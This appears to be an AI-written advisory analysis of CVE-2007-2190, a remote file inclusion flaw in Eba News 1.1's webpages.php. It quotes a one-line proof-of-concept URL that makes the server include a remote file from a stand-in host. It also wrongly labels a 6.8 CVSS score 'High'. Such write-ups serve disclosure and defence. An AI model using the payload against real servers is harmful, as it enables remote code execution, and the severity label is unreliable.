Based on the provided content, here's an analysis of CVE-2007-2190:

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) vulnerability. Specifically, the `webpages.php` script in the `admin/public` directory of Eba News version 1.1 is vulnerable. The vulnerability exists because the script improperly handles user-supplied input, allowing the inclusion of remote files.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary weakness is that the `filename` parameter in `webpages.php` is not properly sanitized, allowing an attacker to specify a remote file to be included and executed on the server.

**Impact of Exploitation:**
- **System Access:** Successful exploitation can lead to system access, potentially allowing an attacker to execute arbitrary code on the server. This could result in:
    - **Complete System Compromise:** An attacker could gain full control of the server, including access to all files, data, and processes.
    - **Data Theft and Manipulation:** Sensitive data could be stolen, altered, or deleted.
    - **Malware Installation:** The attacker could install malware, backdoors, or other malicious software on the system.
    - **Denial of Service:** An attacker could use the vulnerability to cause a denial of service, making the website unavailable to users.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability is exploited by sending an HTTP GET request to the vulnerable `webpages.php` script with a malicious URL as the value of the `filename` parameter.

**Required Attacker Capabilities/Position:**
- **Remote Access:** The attacker needs to be able to send HTTP requests to the server hosting the vulnerable Eba News application.
- **No Authentication:** The vulnerability can be exploited without any authentication.
- **Knowledge of Vulnerable Parameter:** The attacker needs to know that the `filename` parameter in the `webpages.php` file is vulnerable.

**Additional Details:**

- **Proof of Concept:**  The provided content includes a proof of concept: `eba/admin/public/webpages.php?filename=http://attact.com/colok.txt?`. This demonstrates how an attacker can include a remote file from `attact.com`.
- **Affected Software:** The vulnerability specifically affects Eba News version 1.1.
- **CVSS Score:** The provided CVSS base score is 6.8, indicating a "High" severity vulnerability. The exploitability subscore is 8.6 and impact subscore is 6.4.
- **Vendor URL:** The content also includes the vendor URL `http://ebascripts.com/` and the source URL `http://ebascripts.com/`.
